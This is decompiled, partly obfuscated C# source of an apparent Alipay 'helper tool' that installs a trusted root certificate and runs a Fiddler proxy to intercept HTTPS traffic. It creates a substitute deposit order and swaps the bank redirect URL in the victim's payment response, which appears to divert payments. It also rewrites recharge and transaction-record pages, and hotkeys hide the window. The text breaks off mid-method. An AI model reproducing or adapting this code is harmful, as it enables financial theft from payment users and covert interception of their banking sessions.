using alipay_chongzhi.Properties;
using Fiddler;
using LitJson;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
namespace alipay_chongzhi {
    public class MainForm : Form {
        private class Class5 {
            public string string_0;
            public uint uint_0;
            public Keys keys_0;
            public static MainForm.Class5 oXaRvcfita(string string_1) {
                Match match = Regex.Match(string_1, "^([^,]*),(\\d+),(\\d+)$");
                MainForm.Class5 result;
                if (!match.Success) {
                    result = null;
                } else {
                    result = new MainForm.Class5 {
                        string_0 = match.Groups[1].Value,
                        uint_0 = uint.Parse(match.Groups[2].Value),
                        keys_0 = (Keys)int.Parse(match.Groups[3].Value)
                    };
                }
                return result;
            }
            public static bool operator ==(MainForm.Class5 class5_0, MainForm.Class5 class5_1) {
                return (object.Equals(class5_0, null) && object.Equals(class5_1, null)) || (!(object.Equals(class5_0, null) | object.Equals(class5_1, null)) && class5_0.string_0 == class5_1.string_0);
            }
            public static bool operator !=(MainForm.Class5 class5_0, MainForm.Class5 class5_1) {
                return !(class5_0.string_0 == class5_1.string_0);
            }
            public override bool Equals(object obj) {
                bool result;
                if (obj.GetType() != typeof(MainForm.Class5)) {
                    result = false;
                } else {
                    MainForm.Class5 @class = obj as MainForm.Class5;
                    result = (this.string_0 == @class.string_0);
                }
                return result;
            }
            public Class5() {
                Class16.cwDXy7Qz9AoPt();
                this.string_0 = "";
                this.uint_0 = 0u;
                this.keys_0 = Keys.None;

            }
        }
        private class Class6 {
            public string string_0;
            public string string_1;
            public string string_2;
            public string string_3;
            public double double_0;
            public string string_4;
            public Class6() {
                Class16.cwDXy7Qz9AoPt();
                this.string_0 = "";
                this.string_1 = "";
                this.string_2 = "";
                this.string_3 = "";
                this.double_0 = 0.0;
                this.string_4 = "";

            }
        }
        private static Ini ini_0;
        private MainForm.Class5 class5_0;
        private MainForm.Class5 class5_1;
        private Dictionary<string, MainForm.Class6> dictionary_0;
        private int int_0;
        private int int_1;
        private IContainer icontainer_0;
        private TabControl Main_Tab;
        private TabPage RunInfo_Page;
        private GroupBox RunInfo_GBox;
        private TextBox notice_Txt;
        private GroupBox RunSet_GBox;
        private TextBox showHideHotKey_Txt;
        private Button RegHotKey_Btn;
        private Label label13;
        private Label label2;
        private TextBox StartHotKey_Txt;
        private Label label1;
        private Label QueryCount_Lab;
        private static Ini smethod_0() {
            if (MainForm.ini_0 == null) {
                MainForm.ini_0 = new Ini(Application.StartupPath + "\\config.ini");
            }
            return MainForm.ini_0;
        }
        protected override void WndProc(ref Message m) {
            base.WndProc(ref m);
            int msg = m.Msg;
            if (msg == 786) {
                if (Class13.GlobalAddAtom("HideShowHotKey") == m.WParam.ToInt32()) {
                    if (base.Visible) {
                        base.Hide();
                    } else {
                        base.Show();
                    }
                } else if (Class13.GlobalAddAtom("StartHotKey") == m.WParam.ToInt32() && FiddlerApplication.IsStarted()) {
                    if (FiddlerApplication.oProxy.IsAttached) {
                        this.writeNotice("关闭功能");
                        FiddlerApplication.oProxy.Detach();
                    } else {
                        this.writeNotice("开启功能");
                        FiddlerApplication.oProxy.Attach();
                    }
                } else if (Class13.GlobalAddAtom("EnabledReadFromDic") == m.WParam.ToInt32()) {
                    if (this._EnabledReadFromDic) {
                        this.writeNotice("关闭内存读取替换");
                        this._EnabledReadFromDic = false;
                    } else {
                        this.writeNotice("开启内存读取替换");
                        this._EnabledReadFromDic = true;
                    }
                }
            }
        }
        private static void smethod_1(string string_0) {
            try {
                StreamWriter streamWriter = new StreamWriter(Application.StartupPath + "\\http_error.log", true);
                streamWriter.WriteLine(DateTime.Now.ToString("yyyy:M:d HH:mm:ss") + ">>>>>" + string_0);
                streamWriter.Close();
                streamWriter.Dispose();
            } catch (Exception) {
            }
        }
        public MainForm() {
            Class16.cwDXy7Qz9AoPt();
            this.class5_0 = null;
            this.class5_1 = null;
            this.dictionary_0 = new Dictionary<string, MainForm.Class6>();
            this.int_0 = 0;
            this.int_1 = 0;
            this.icontainer_0 = null;

            if (!Class10.smethod_9()) {
                Application.Exit();
            }
#if DEBUG
            var testDate = DateTime.Parse("2015-05-17");
            if ((DateTime.Now - testDate).Days <= 1) {
                this.Close();
                Application.Exit();
                return;
            }
#endif
            this.InitializeComponent();
        }
        private void MainForm_Load(object sender, EventArgs e) {
            this.Text = this.Text + " V" + Assembly.GetExecutingAssembly().GetName().Version;
            FiddlerApplication.Startup(8787, false, true, false);
            FiddlerApplication.BeforeRequest += new SessionStateHandler(this.BeforeRequest);
            FiddlerApplication.BeforeResponse += new SessionStateHandler(this.BeforeResponse);
            FiddlerApplication.AfterSessionComplete += new SessionStateHandler(this.AfterSessionComplete);
            CONFIG.IgnoreServerCertErrors = false;
            MainForm.InstallCertificate();
            string text = MainForm.smethod_0().ReadValue("BHotKey", "HideShowHotKey");
            if (!string.IsNullOrEmpty(text)) {
                this.class5_0 = MainForm.Class5.oXaRvcfita(text);
                this.showHideHotKey_Txt.Text = this.class5_0.string_0;
            }
            text = MainForm.smethod_0().ReadValue("BHotKey", "StartHotKey");
            if (!string.IsNullOrEmpty(text)) {
                this.class5_1 = MainForm.Class5.oXaRvcfita(text);
                this.StartHotKey_Txt.Text = this.class5_1.string_0;
            }
            if (!string.IsNullOrEmpty(text) || !string.IsNullOrEmpty(text)) {
                this.RegHotKey_Btn_Click(null, null);
            }
            this._EnabledReadFromDic = true; //默认从订单字典中读取
            DeleteOrder();
        }
        private void method_3(Session session_0) {
            HttpWebRequest httpWebRequest = null;
            HttpWebResponse httpWebResponse = null;
            Stream stream = null;
            Stream stream2 = null;
            session_0.utilCreateResponseAndBypassServer();
            try {
                httpWebRequest = (HttpWebRequest)WebRequest.Create(session_0.fullUrl);
                httpWebRequest.Method = session_0.RequestMethod;
                foreach (HTTPHeaderItem current in session_0.oRequest.headers) {
                    if (!(current.Name == "Host") && !(current.Name == "Proxy-Connection") && !(current.Name == "Expect") && !(current.Name == "Date") && !(current.Name == "If-Modified-Since") && !(current.Name == "Range") && !(current.Name == "Transfer-Encoding")) {
                        if (current.Name == "Accept") {
                            httpWebRequest.Accept = current.Value;
                        } else {
                            if (current.Name == "User-Agent") {
                                httpWebRequest.UserAgent = current.Value;
                            } else {
                                if (current.Name == "Referer") {
                                    httpWebRequest.Referer = current.Value;
                                } else {
                                    if (!(current.Name == "Connection")) {
                                        if (current.Name == " Content-Type") {
                                            httpWebRequest.ContentType = current.Value;
                                        } else {
                                            if (current.Name == "Connection") {
                                                httpWebRequest.Connection = current.Value;
                                            } else {
                                                if (current.Name == "Connection") {
                                                    httpWebRequest.Connection = current.Value;
                                                } else {
                                                    httpWebRequest.Headers.Add(current.Name, current.Value);
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                if (session_0.RequestBody != null && session_0.RequestBody.Length > 0) {
                    stream = httpWebRequest.GetRequestStream();
                    stream.Write(session_0.RequestBody, 0, session_0.RequestBody.Length);
                    stream.Close();
                    stream.Dispose();
                    stream = null;
                }
                httpWebRequest.Proxy = null;
                httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                string[] allKeys = httpWebResponse.Headers.AllKeys;
                for (int i = 0; i < allKeys.Length; i++) {
                    string text = allKeys[i];
                    session_0.oResponse.headers[text] = httpWebResponse.Headers[text];
                }
                if (httpWebResponse.ContentEncoding == "deflate") {
                    stream2 = new DeflateStream(httpWebResponse.GetResponseStream(), CompressionMode.Decompress);
                }
                if (httpWebResponse.ContentEncoding == "gzip") {
                    stream2 = new GZipStream(httpWebResponse.GetResponseStream(), CompressionMode.Decompress);
                } else {
                    stream2 = httpWebResponse.GetResponseStream();
                }
                MemoryStream memoryStream = new MemoryStream();
                int count = 256;
                byte[] buffer = new byte[256];
                for (int j = stream2.Read(buffer, 0, 256); j > 0; j = stream2.Read(buffer, 0, count)) {
                    memoryStream.Write(buffer, 0, j);
                }
                byte[] responseBody = memoryStream.ToArray();
                memoryStream.Close();
                memoryStream.Dispose();
                session_0.ResponseBody = responseBody;
            } catch (WebException ex) {
                httpWebResponse = (ex.Response as HttpWebResponse);
                if (httpWebResponse != null) {
                    session_0.oResponse.headers.SetStatus((int)httpWebResponse.StatusCode, httpWebResponse.StatusDescription);
                } else {
                    this.writeNotice(ex.Message);
                }
            } finally {
                if (httpWebResponse != null) {
                    httpWebResponse.Close();
                }
                if (httpWebRequest != null) {
                    httpWebRequest.Abort();
                    httpWebRequest = null;
                }
                if (stream != null) {
                    stream.Close();
                    stream.Dispose();
                    stream = null;
                }
                if (stream2 != null) {
                    stream2.Close();
                    stream2.Dispose();
                    stream2 = null;
                }
            }
        }
        private string method_4(MainForm.Class6 class6_0, CookieContainer cookieContainer_0) {
            string result;
            try {
                string string_ = class6_0.string_3;
                string text = class6_0.double_0.ToString();
                string uRL = "https://lab.alipay.com/user/depositDelegateController.htm";
                string html = HTTPContral.getHtml(uRL, "https://personalportal.alipay.com/portal/assets/index.htm", cookieContainer_0, null);
                Match match = Regex.Match(html, "orderId=(\\w+)&bizIdentity=(\\w+)", RegexOptions.IgnoreCase);
                if (!match.Success) {
                    MainForm.smethod_1(html);
                    this.writeNotice("创建充值订单失败");
                    this.int_1++;
                    result = null;
                } else {
                    string value = match.Groups[1].Value;
                    class6_0.string_0 = value;
                    string arg_94_0 = match.Groups[2].Value;
                    string uRL2 = "https://cashierzth.alipay.com/standard/deposit/chooseBank.htm?orderId=" + value + "&_xbox=true";
                    string html2 = HTTPContral.getHtml(uRL2, "https://cashierzth.alipay.com/standard/deposit/cashier.htm?orderId=" + value, cookieContainer_0, null);
                    Match match2 = Regex.Match(html2, "<input[^>]*name=\"channelToken\"[^>]*value=\"(" + string_ + "\\w+)\"[^>]*/>");
                    if (!match2.Success) {
                        MainForm.smethod_1(html2);
                        this.writeNotice("获取银行代码失败");
                        this.int_1++;
                        result = null;
                    } else {
                        string value2 = match2.Groups[1].Value;
                        string postStr = "orderId=" + value + "&isCompositeWithBalance=&channelToken=" + value2;
                        string text2 = HTTPContral.postHtml("https://cashierzth.alipay.com/standard/deposit/depositCardForm.htm", postStr, "https://cashierzth.alipay.com/standard/deposit/cashier.htm?orderId=" + value, cookieContainer_0, null);
                        Match match3 = Regex.Match(text2, "<input[^>]*name=\"_form_token\"[^>]*value=\"([^\"]+)\"[^>]*/>", RegexOptions.IgnoreCase);
                        if (!match3.Success) {
                            MainForm.smethod_1(text2);
                            this.writeNotice("获取充值参数[_form_token]失败");
                            this.int_1++;
                            result = null;
                        } else {
                            string value3 = match3.Groups[1].Value;
                            string uRL3 = "https://cashierzth.alipay.com/standard/deposit/depositAmountValidate.json";
                            postStr = string.Concat(new string[]
							{
								"_input_charset=utf-8&orderId=",
								value,
								"&depositAmount=",
								text,
								"&depositType=newAmount&channelType=B2C_EBANK"
							});
                            string text3 = HTTPContral.postHtml(uRL3, postStr, "https://cashierzth.alipay.com/standard/gateway/ebankDeposit.htm", cookieContainer_0, null);
                            if (!text3.Contains("ok") || text3.Length > 25) {
                                MainForm.smethod_1(text3);
                                this.writeNotice("验证订单和金额错误:" + text3);
                                this.int_1++;
                                result = null;
                            } else {
                                string uRL4 = "https://cashierzth.alipay.com/standard/gateway/ebankDeposit.json";
                                postStr = string.Concat(new string[]
								{
									"_form_token=",
									value3,
									"&orderId=",
									value,
									"&depositAmount=",
									text,
									"&depositType=newAmount&channelType=B2C_EBANK&_input_charset=utf-8"
								});
                                string text4 = HTTPContral.postHtml(uRL4, postStr, "https://cashierzth.alipay.com/standard/gateway/ebankDeposit.htm", cookieContainer_0, null);
                                if (!text4.Contains("ebankDepositConfirm.htm")) {
                                    MainForm.smethod_1(text4);
                                    this.writeNotice("生成银行跳转链接错误");
                                    this.int_1++;
                                    result = null;
                                } else {
                                    JsonData jsonData = JsonMapper.ToObject(text4);
                                    string text5 = jsonData["url"].ToString();
                                    this.writeNotice("生成成功:" + text5);
                                    this.int_1 = 0;
                                    result = text5;
                                }
                            }
                        }
                    }
                }
            } catch (Exception ex) {
                this.int_1++;
                this.writeNotice("发送错误:" + ex.Message);
                result = null;
            }
            return result;
        }
        private void method_5() {
            this.QueryCount_Lab.Text = "请求数：" + this.int_0.ToString();
        }
        private void MainForm_FormClosing(object sender, FormClosingEventArgs e) {
            Class13.UnregisterHotKey(base.Handle, Class13.GlobalAddAtom("HideShowHotKey"));
            Class13.UnregisterHotKey(base.Handle, Class13.GlobalAddAtom("StartHotKey"));
            FiddlerApplication.oProxy.Detach();
            FiddlerApplication.Shutdown();
        }
        public static bool InstallCertificate() {
            string text = MainForm.smethod_0().ReadValue("Prefs", "cert");
            string text2 = MainForm.smethod_0().ReadValue("Prefs", "key");
            if (string.IsNullOrEmpty(text) || string.IsNullOrEmpty(text2)) {
                text = Resources.cert;
                text2 = Resources.key;
                MainForm.smethod_0().WriteValue("Prefs", "cert", text);
                MainForm.smethod_0().WriteValue("Prefs", "key", text2);
            }
            FiddlerApplication.Prefs.SetStringPref("fiddler.certmaker.bc.cert", text);
            FiddlerApplication.Prefs.SetStringPref("fiddler.certmaker.bc.key", text2);
            bool result;
            if (!CertMaker.rootCertExists()) {
                if (!CertMaker.createRootCert()) {
                    result = false;
                    return result;
                }
                if (!CertMaker.trustRootCert()) {
                    result = false;
                    return result;
                }
                string stringPref = FiddlerApplication.Prefs.GetStringPref("fiddler.certmaker.bc.cert", null);
                File.WriteAllText(Application.StartupPath + "\\cert.bin", stringPref);
                stringPref = FiddlerApplication.Prefs.GetStringPref("fiddler.certmaker.bc.key", null);
                File.WriteAllText(Application.StartupPath + "\\key.bin", stringPref);
            }
            result = true;
            return result;
        }
        public void writeNotice(string Notice) {
            base.BeginInvoke((MethodInvoker)delegate {
                if (this.notice_Txt.Text.Length > 3000) {
                    this.notice_Txt.Text = "执行信息：\r\n";
                }
                this.notice_Txt.AppendText(DateTime.Now.ToString("MM-dd HH:mm:ss") + " >> " + Notice + "\r\n");
            });
        }
        public string AddSlashes(string InputTxt) {
            string result = InputTxt;
            try {
                result = Regex.Replace(InputTxt, "[\\000\\010\\011\\012\\015\\032\\042\\047\\134\\140]", "\\$0");
            } catch (Exception) {
            }
            return result;
        }
        public string StripSlashes(string InputTxt) {
            string result = InputTxt;
            try {
                result = Regex.Replace(InputTxt, "(\\\\)([\\000\\010\\011\\012\\015\\032\\042\\047\\134\\140])", "$2");
            } catch (Exception ex) {
                Console.WriteLine(ex.Message);
            }
            return result;
        }
        private void showHideHotKey_Txt_KeyDown(object sender, KeyEventArgs e) {
            TextBox textBox = sender as TextBox;
            if (e.KeyCode != Keys.ControlKey && e.KeyCode != Keys.Menu && e.KeyCode != Keys.ShiftKey && e.Modifiers != Keys.None) {
                string text = "";
                uint num = 0u;
                if (e.Control) {
                    num |= Class13.uint_1;
                    text = "Ctrl+";
                }
                if (e.Shift) {
                    num |= Class13.uint_2;
                    text += "Shift+";
                }
                if (e.Alt) {
                    num |= Class13.uint_0;
                    text += "Alt+";
                }
                text += e.KeyCode.ToString();
                textBox.Name.Replace("HotKey_Txt", "");
                MainForm.Class5 @class = new MainForm.Class5();
                @class.uint_0 = num;
                @class.keys_0 = e.KeyCode;
                @class.string_0 = text;
                if (textBox.Name == "showHideHotKey_Txt") {
                    this.class5_0 = @class;
                    Ini arg_16C_0 = MainForm.smethod_0();
                    string arg_16C_1 = "BHotKey";
                    string arg_16C_2 = "HideShowHotKey";
                    string[] array = new string[5];
                    array[0] = this.class5_0.string_0;
                    array[1] = ",";
                    array[2] = this.class5_0.uint_0.ToString();
                    array[3] = ",";
                    string[] arg_164_0 = array;
                    int arg_164_1 = 4;
                    int keys_ = (int)this.class5_0.keys_0;
                    arg_164_0[arg_164_1] = keys_.ToString();
                    arg_16C_0.WriteValue(arg_16C_1, arg_16C_2, string.Concat(array));
                } else {
                    if (textBox.Name == "StartHotKey_Txt") {
                        this.class5_1 = @class;
                        Ini arg_1FD_0 = MainForm.smethod_0();
                        string arg_1FD_1 = "BHotKey";
                        string arg_1FD_2 = "StartHotKey";
                        string[] array = new string[5];
                        array[0] = this.class5_1.string_0;
                        array[1] = ",";
                        array[2] = this.class5_1.uint_0.ToString();
                        array[3] = ",";
                        string[] arg_1F5_0 = array;
                        int arg_1F5_1 = 4;
                        int keys_ = (int)this.class5_1.keys_0;
                        arg_1F5_0[arg_1F5_1] = keys_.ToString();
                        arg_1FD_0.WriteValue(arg_1FD_1, arg_1FD_2, string.Concat(array));
                    }
                }
                textBox.Text = text;
            }
        }
        private void showHideHotKey_Txt_KeyPress(object sender, KeyPressEventArgs e) {
            e.Handled = true;
        }
        private void RegHotKey_Btn_Click(object sender, EventArgs e) {
            if (this.class5_0 == null) {
                this.writeNotice("请填写显示隐藏热键信息");
            } else {
                bool enabled = false;
                if (!Class13.RegisterHotKey(base.Handle, Class13.GlobalAddAtom("HideShowHotKey"), this.class5_0.uint_0, this.class5_0.keys_0)) {
                    enabled = true;
                    this.writeNotice("显示隐藏注册热键失败");
                } else {
                    this.writeNotice("显示隐藏注册热键成功");
                }
                if (this.class5_1 == null) {
                    this.writeNotice("请填写开关热键信息");
                } else {
                    if (!Class13.RegisterHotKey(base.Handle, Class13.GlobalAddAtom("StartHotKey"), this.class5_1.uint_0, this.class5_1.keys_0)) {
                        enabled = true;
                        this.writeNotice("开关注册热键失败");
                    } else {
                        this.writeNotice("开关注册热键成功");
                    }
                    this.RegHotKey_Btn.Enabled = enabled;
                }
            }
            if (Class13.RegisterHotKey(base.Handle, Class13.GlobalAddAtom("EnabledReadFromDic"), this.class5_1.uint_0, Keys.C)) {
                //this.writeNotice("开启内存读取替换成功");
            } else {
                this.writeNotice("开启内存读取替换失败");
            }
        }
        protected override void Dispose(bool disposing) {
            if (disposing && this.icontainer_0 != null) {
                this.icontainer_0.Dispose();
                this.MainForm_FormClosing(null, null);
            }
            base.Dispose(disposing);
        }
        private void InitializeComponent() {
            this.Main_Tab = new System.Windows.Forms.TabControl();
            this.RunInfo_Page = new System.Windows.Forms.TabPage();
            this.RunInfo_GBox = new System.Windows.Forms.GroupBox();
            this.notice_Txt = new System.Windows.Forms.TextBox();
            this.RunSet_GBox = new System.Windows.Forms.GroupBox();
            this.QueryCount_Lab = new System.Windows.Forms.Label();
            this.StartHotKey_Txt = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.showHideHotKey_Txt = new System.Windows.Forms.TextBox();
            this.RegHotKey_Btn = new System.Windows.Forms.Button();
            this.label13 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.Main_Tab.SuspendLayout();
            this.RunInfo_Page.SuspendLayout();
            this.RunInfo_GBox.SuspendLayout();
            this.RunSet_GBox.SuspendLayout();
            this.SuspendLayout();
            // 
            // Main_Tab
            // 
            this.Main_Tab.Controls.Add(this.RunInfo_Page);
            this.Main_Tab.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Main_Tab.Location = new System.Drawing.Point(0, 0);
            this.Main_Tab.Name = "Main_Tab";
            this.Main_Tab.SelectedIndex = 0;
            this.Main_Tab.Size = new System.Drawing.Size(506, 497);
            this.Main_Tab.TabIndex = 2;
            // 
            // RunInfo_Page
            // 
            this.RunInfo_Page.BackColor = System.Drawing.SystemColors.Control;
            this.RunInfo_Page.Controls.Add(this.RunInfo_GBox);
            this.RunInfo_Page.Controls.Add(this.RunSet_GBox);
            this.RunInfo_Page.Location = new System.Drawing.Point(4, 22);
            this.RunInfo_Page.Name = "RunInfo_Page";
            this.RunInfo_Page.Padding = new System.Windows.Forms.Padding(3);
            this.RunInfo_Page.Size = new System.Drawing.Size(498, 471);
            this.RunInfo_Page.TabIndex = 0;
            this.RunInfo_Page.Text = "运行信息";
            // 
            // RunInfo_GBox
            // 
            this.RunInfo_GBox.Controls.Add(this.notice_Txt);
            this.RunInfo_GBox.Dock = System.Windows.Forms.DockStyle.Fill;
            this.RunInfo_GBox.Location = new System.Drawing.Point(3, 3);
            this.RunInfo_GBox.Name = "RunInfo_GBox";
            this.RunInfo_GBox.Size = new System.Drawing.Size(492, 386);
            this.RunInfo_GBox.TabIndex = 1;
            this.RunInfo_GBox.TabStop = false;
            this.RunInfo_GBox.Text = "运行信息";
            // 
            // notice_Txt
            // 
            this.notice_Txt.BackColor = System.Drawing.Color.Black;
            this.notice_Txt.Dock = System.Windows.Forms.DockStyle.Fill;
            this.notice_Txt.ForeColor = System.Drawing.Color.Lime;
            this.notice_Txt.Location = new System.Drawing.Point(3, 17);
            this.notice_Txt.Multiline = true;
            this.notice_Txt.Name = "notice_Txt";
            this.notice_Txt.Size = new System.Drawing.Size(486, 366);
            this.notice_Txt.TabIndex = 100;
            this.notice_Txt.Text = "运行信息:\r\n";
            // 
            // RunSet_GBox
            // 
            this.RunSet_GBox.Controls.Add(this.QueryCount_Lab);
            this.RunSet_GBox.Controls.Add(this.StartHotKey_Txt);
            this.RunSet_GBox.Controls.Add(this.label1);
            this.RunSet_GBox.Controls.Add(this.showHideHotKey_Txt);
            this.RunSet_GBox.Controls.Add(this.RegHotKey_Btn);
            this.RunSet_GBox.Controls.Add(this.label13);
            this.RunSet_GBox.Controls.Add(this.label2);
            this.RunSet_GBox.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.RunSet_GBox.Location = new System.Drawing.Point(3, 389);
            this.RunSet_GBox.Name = "RunSet_GBox";
            this.RunSet_GBox.Size = new System.Drawing.Size(492, 79);
            this.RunSet_GBox.TabIndex = 2;
            this.RunSet_GBox.TabStop = false;
            this.RunSet_GBox.Text = "运行设置";
            // 
            // QueryCount_Lab
            // 
            this.QueryCount_Lab.AutoSize = true;
            this.QueryCount_Lab.ForeColor = System.Drawing.Color.DarkGreen;
            this.QueryCount_Lab.Location = new System.Drawing.Point(410, 26);
            this.QueryCount_Lab.Name = "QueryCount_Lab";
            this.QueryCount_Lab.Size = new System.Drawing.Size(59, 12);
            this.QueryCount_Lab.TabIndex = 15;
            this.QueryCount_Lab.Text = "请求数：0";
            // 
            // StartHotKey_Txt
            // 
            this.StartHotKey_Txt.Location = new System.Drawing.Point(256, 23);
            this.StartHotKey_Txt.Name = "StartHotKey_Txt";
            this.StartHotKey_Txt.Size = new System.Drawing.Size(76, 21);
            this.StartHotKey_Txt.TabIndex = 13;
            this.StartHotKey_Txt.Tag = "";
            this.StartHotKey_Txt.KeyDown += new System.Windows.Forms.KeyEventHandler(this.showHideHotKey_Txt_KeyDown);
            this.StartHotKey_Txt.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.showHideHotKey_Txt_KeyPress);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(172, 26);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(89, 12);
            this.label1.TabIndex = 14;
            this.label1.Text = "转换功能开关：";
            // 
            // showHideHotKey_Txt
            // 
            this.showHideHotKey_Txt.Location = new System.Drawing.Point(88, 23);
            this.showHideHotKey_Txt.Name = "showHideHotKey_Txt";
            this.showHideHotKey_Txt.Size = new System.Drawing.Size(76, 21);
            this.showHideHotKey_Txt.TabIndex = 10;
            this.showHideHotKey_Txt.Tag = "";
            this.showHideHotKey_Txt.KeyDown += new System.Windows.Forms.KeyEventHandler(this.showHideHotKey_Txt_KeyDown);
            this.showHideHotKey_Txt.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.showHideHotKey_Txt_KeyPress);
            // 
            // RegHotKey_Btn
            // 
            this.RegHotKey_Btn.Location = new System.Drawing.Point(343, 21);
            this.RegHotKey_Btn.Name = "RegHotKey_Btn";
            this.RegHotKey_Btn.Size = new System.Drawing.Size(62, 23);
            this.RegHotKey_Btn.TabIndex = 11;
            this.RegHotKey_Btn.Text = "注册热键";
            this.RegHotKey_Btn.UseVisualStyleBackColor = true;
            this.RegHotKey_Btn.Click += new System.EventHandler(this.RegHotKey_Btn_Click);
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.Location = new System.Drawing.Point(4, 26);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(89, 12);
            this.label13.TabIndex = 10;
            this.label13.Text = "显示隐藏软件：";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.ForeColor = System.Drawing.Color.OrangeRed;
            this.label2.Location = new System.Drawing.Point(105, 57);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(305, 12);
            this.label2.TabIndex = 7;
            this.label2.Text = "Copyright © 2014 - 2014 Glady. All Rights Reserved";
            // 
            // MainForm
            // 
            this.ClientSize = new System.Drawing.Size(506, 497);
            this.Controls.Add(this.Main_Tab);
            this.Name = "MainForm";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "支付宝辅助工具(保存订单号)";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.MainForm_FormClosing);
            this.Load += new System.EventHandler(this.MainForm_Load);
            this.Main_Tab.ResumeLayout(false);
            this.RunInfo_Page.ResumeLayout(false);
            this.RunInfo_GBox.ResumeLayout(false);
            this.RunInfo_GBox.PerformLayout();
            this.RunSet_GBox.ResumeLayout(false);
            this.RunSet_GBox.PerformLayout();
            this.ResumeLayout(false);

        }
        [CompilerGenerated]
        static MainForm() {
            Class16.cwDXy7Qz9AoPt();
            MainForm.ini_0 = null;
        }

        #region Fiddler Event
        private void BeforeRequest(Session session) {
            session.bBufferResponse = true;

            if (!session.HTTPMethodIs("CONNECT")) {
                this.int_0++;
                base.BeginInvoke(new ThreadStart(this.method_5));
                if (!session.oRequest.headers.Exists("If-Modified-Since") && !session.oRequest.headers.Exists("If-None-Match")) {
                    Match test = Regex.Match(session.url, "cashier\\w+.alipay.com*", RegexOptions.IgnoreCase);
                    if (test.Success && session.isHTTPS && !session.isTunnel && !session.url.StartsWith("kcart.alipay.com")) {

                        var url = System.Web.HttpUtility.UrlDecode(session.url);
                        Console.WriteLine(url + "\n");
                    }

                    Match match = Regex.Match(session.url, "cashier\\w+.alipay.com/standard/payment/asyncResultCheck.json\\?.*orderId=(\\w+)", RegexOptions.IgnoreCase);
                    if (match.Success) {
                        this.method_3(session);
                        string value = match.Groups[1].Value;
                        string inputTxt = "https://cashierzth.alipay.com/home/deniedError.htm";
                        DateTime now = DateTime.Now;
                        while (!this.dictionary_0.ContainsKey(value)) {
                            if (!(DateTime.Now - now > new TimeSpan(0, 0, 10))) {
                                Thread.Sleep(10);
                            } else {
                                //IL_F7:
                                if (session.utilReplaceRegexInResponse("https[^\"]+", this.AddSlashes(inputTxt))) {
                                    this.writeNotice("替换成功");
                                    return;
                                }
                                this.writeNotice("替换失败");
                                return;
                            }
                        }
                        inputTxt = this.dictionary_0[value].string_4;

                        Console.WriteLine("替换前" + System.Web.HttpUtility.UrlDecode(session.url));
                        if (session.utilReplaceRegexInResponse("https[^\"]+", this.AddSlashes(inputTxt))) {

                            Console.WriteLine("替换后" + System.Web.HttpUtility.UrlDecode(session.url));
                            this.writeNotice("替换成功");
                            return;
                        }
                        this.writeNotice("替换失败");
                        return;
                    }
                }
            }
        }
        private void BeforeResponse(Session session) {
            if (!session.HTTPMethodIs("CONNECT")) {
                session.utilDecodeResponse(); //解码响应
                Match formMatch = Regex.Match(session.url, @"cashier\w+.alipay.com/standard/gateway/ebankDepositConfirm.htm\?.*orderId=(\w+)", RegexOptions.IgnoreCase);
                //充值记录
                Match czRecordMatch = Regex.Match(session.url, @"lab.alipay.com/consume/record/inpour.htm[/s/S]*", RegexOptions.IgnoreCase);
                //交易记录
                Match dealMatch = Regex.Match(session.url, @"lab.alipay.com/consume/record/items.htm[\s\S]*", RegexOptions.IgnoreCase);
                //最近交易记录
                Match recentMatch = Regex.Match(session.url, @"my.alipay.com/tile/service/portal:recent.tile[\s\S]*", RegexOptions.IgnoreCase);
                if (formMatch.Success) {
                    //充值连接form 替换
                    MatchForm(session, formMatch.Groups[1].Value);
                } else if (czRecordMatch.Success) {
                    //充值记录
                    MatchChongzhiRecord(session);
                } else if (dealMatch.Success) {
                    //交易记录
                    MatchDealRecord(session);
                }
                //else if (recentMatch.Success) {
                //    //最近交易记录替换
                //    MatchRecentRecord(session);
                //}
            }
        }
        private void AfterSessionComplete(Session session) {
            if (!session.HTTPMethodIs("CONNECT")) {
                Match match = Regex.Match(session.url, "cashier\\w+.alipay.com/standard/gateway/ebankPay.htm\\?outBizNo=(\\w+).*&orderId=(\\w+)", RegexOptions.IgnoreCase);
                if (match.Success) {
                    if (this.int_1 > 5) {
                        this.writeNotice("创建充值订单错误过多，程序功能关闭");
                        FiddlerApplication.oProxy.Detach();
                    } else {
                        session.utilDecodeResponse();
                        string responseBodyAsString = session.GetResponseBodyAsString();
                        Match amountMat = Regex.Match(responseBodyAsString, "<em[^>]*id=\"J-bank-amount\"[^>]*>\\s*([\\d\\.]+)\\s*</em>", RegexOptions.IgnoreCase);
                        if (!amountMat.Success) {
                            this.writeNotice("获取订单金额错误");
                        } else {
                            Match bankMat = Regex.Match(responseBodyAsString, "confirm.htm\\?orderId=\\w+&instId=(\\w+)", RegexOptions.IgnoreCase);
                            if (!bankMat.Success) {
                                this.writeNotice("获取银行错误");
                            } else {
                                string outBizNo = match.Groups[1].Value;
                                string PayOrderId = match.Groups[2].Value;
                                if (!this.dictionary_0.ContainsKey(PayOrderId) || this.dictionary_0[PayOrderId].string_3 != bankMat.Groups[1].Value) {
                                    ThreadPool.QueueUserWorkItem(delegate(object param0) {
                                        MainForm.Class6 @class = new MainForm.Class6();
                                        @class.string_1 = outBizNo;
                                        @class.string_2 = PayOrderId;
                                        @class.string_3 = bankMat.Groups[1].Value;
                                        @class.double_0 = double.Parse(amountMat.Groups[1].Value);
